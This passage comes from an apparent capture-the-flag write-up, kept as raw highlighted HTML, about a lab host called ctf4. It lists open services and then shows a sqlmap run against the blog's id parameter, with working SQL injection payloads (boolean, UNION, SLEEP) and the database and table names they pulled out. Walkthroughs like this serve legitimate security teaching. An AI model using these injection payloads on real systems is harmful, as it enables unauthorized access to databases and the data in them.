&lt;span class="code-line"&gt;&lt;span class="k"&gt;No&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;exact&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;OS&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;matches&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;host&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;test&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;conditions&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;non&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;ideal&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Service&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;Info&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;Host&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ctf4&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sas&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;upenn&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;edu&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;OS&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Unix&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We found a list of available services:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;a SSH service on port 22&lt;/li&gt;
&lt;li&gt;a mail service on port 25&lt;/li&gt;
&lt;li&gt;a web service on port 80, note that there is five disallowed entries in robots.txt&lt;/li&gt;
&lt;li&gt;and a close CUPS service on port 631.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="the-website"&gt;The website&lt;/h2&gt;
&lt;p&gt;Let's take a look at the web site. It is a simple blog site with a XSS flaw on
the search engine.&lt;/p&gt;
&lt;p&gt;The article are indexed with a GET parameter id. This parameter is vulnerable to
an SQL injection.&lt;/p&gt;
&lt;h1 id="exploitation"&gt;Exploitation&lt;/h1&gt;
&lt;h2 id="sqlmap"&gt;Sqlmap&lt;/h2&gt;
&lt;p&gt;We launch sqlmap:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;#sqlmap&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;u&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;http://192.168.1.56/index.html?page=blog&amp;amp;title=Blog&amp;amp;id=6&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;tables&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;sqlmap&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;identified&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;following&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;injection&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;points&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;with&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;total&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;of&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;HTTP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;requests&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;---&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="nl"&gt;Place&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;GET&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="k"&gt;Parameter&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="nl"&gt;Type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;boolean&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;based&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;blind&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="nl"&gt;Title&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;AND&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;boolean&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;based&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;blind&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;WHERE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;or&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;HAVING&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;clause&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="nl"&gt;Payload&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;page&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;blog&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;title&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;Blog&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;AND&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;2396&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;2396&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="nl"&gt;Type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;UNION&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="nl"&gt;Title&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;MySQL&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;UNION&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;columns&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="nl"&gt;Payload&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;page&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;blog&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;title&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;Blog&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;UNION&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;ALL&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nf"&gt;CONCAT&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x7172756f71&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mh"&gt;0x494c647a675a47595a55&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mh"&gt;0x7178657471&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="k"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="k"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="k"&gt;NULL&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="nl"&gt;Type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;AND&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="ow"&gt;OR&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nc"&gt;time&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;based&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;blind&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="nl"&gt;Title&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;MySQL&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;5.0.11&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;AND&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nc"&gt;time&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;based&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;blind&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="nl"&gt;Payload&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;page&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;blog&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;title&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;Blog&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;AND&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;SLEEP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;---&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;19:44:24&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;INFO&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;back&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="k"&gt;end&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;DBMS&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;is&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;MySQL&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;web&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;operating&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;system&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Linux&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Fedora&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Bordeaux&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;web&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;application&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;technology&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Apache&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;2.2.0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;PHP&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;5.1.2&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;back&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="k"&gt;end&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;DBMS&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;MySQL&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;5.0.11&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;19:44:24&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;INFO&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;fetching&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;database&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;names&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;19:44:24&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;INFO&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;fetching&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;tables&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;databases&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;calendar, ehks, information_schema, mysql, roundcubemail, test&amp;#39;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="k"&gt;Database&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;calendar&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;5 tables&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;+---------------------------------------+&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;phpc_calendars&lt;/span&gt;&lt;span class="w"&gt;                        &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;phpc_events&lt;/span&gt;&lt;span class="w"&gt;                           &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;phpc_sequence&lt;/span&gt;&lt;span class="w"&gt;                         &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;phpc_users&lt;/span&gt;&lt;span class="w"&gt;                            &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="w"&gt;                                   &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;+---------------------------------------+&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="k"&gt;Database&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;roundcubemail&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;6 tables&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;+---------------------------------------+&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;session&lt;/span&gt;&lt;span class="w"&gt;                               &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;cache&lt;/span&gt;&lt;span class="w"&gt;                                 &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;contacts&lt;/span&gt;&lt;span class="w"&gt;                              &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;identities&lt;/span&gt;&lt;span class="w"&gt;                            &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;messages&lt;/span&gt;&lt;span class="w"&gt;                              &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;users&lt;/span&gt;&lt;span class="w"&gt;                                 &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;+---------------------------------------+&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="k"&gt;Database&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ehks&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;3 tables&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;+---------------------------------------+&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;user&lt;/span&gt;&lt;span class="w"&gt;                                  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;blog&lt;/span&gt;&lt;span class="w"&gt;                                  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
